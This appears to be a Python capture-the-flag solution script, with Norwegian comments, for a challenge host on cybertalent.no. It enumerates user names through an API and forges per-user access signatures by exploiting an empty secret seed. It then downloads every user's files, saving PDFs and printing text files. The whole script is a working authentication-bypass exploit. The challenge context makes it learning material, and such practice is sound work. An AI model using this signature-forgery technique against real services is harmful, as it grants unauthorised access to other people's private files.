import hashlib
import requests
import base64
import re

def sha256_buf(data):
    return hashlib.sha256(data.encode()).digest()

def xor_bytes(a, b):
    return bytes(x ^ y for x, y in zip(a, b))

def sign(user):
    SEED = ''  # Alltid tom pga homoglyph-bug
    user_hash = sha256_buf(user)
    sig = xor_bytes(user_hash, sha256_buf(SEED))
    return sig.hex()

base_url = "https://digifil.ctf.cybertalent.no"
users_resp = requests.get(f"{base_url}/api/users")
users = users_resp.json().get('users', [])

print(f"Fant brukere: {users}")

for user in users:
    signature = sign(user)
    files_url = f"{base_url}/files/{user}/{signature}"
    resp = requests.get(files_url)
    
    print(f"\n=== {user} ===")
    
    content = resp.text
    
    # Split på filnavn-mønster
    parts = content.split('\n\n')
    
    for part in parts:
        if ':' in part:
            lines = part.split('\n', 1)
            if len(lines) >= 2:
                filename = lines[0].rstrip(':')
                file_content = lines[1]
                
                if filename.endswith('.pdf'):
                    # Dekod base64 og lagre som PDF
                    try:
                        pdf_data = base64.b64decode(file_content)
                        safe_filename = f"{user.replace(' ', '_')}_{filename}"
                        with open(safe_filename, 'wb') as f:
                            f.write(pdf_data)
                        print(f"Lagret: {safe_filename} ({len(pdf_data)} bytes)")
                    except Exception as e:
                        print(f"Feil ved dekoding av {filename}: {e}")
                else:
                    # Tekstfil - print innhold
                    print(f"Fil: {filename}")
                    print(file_content)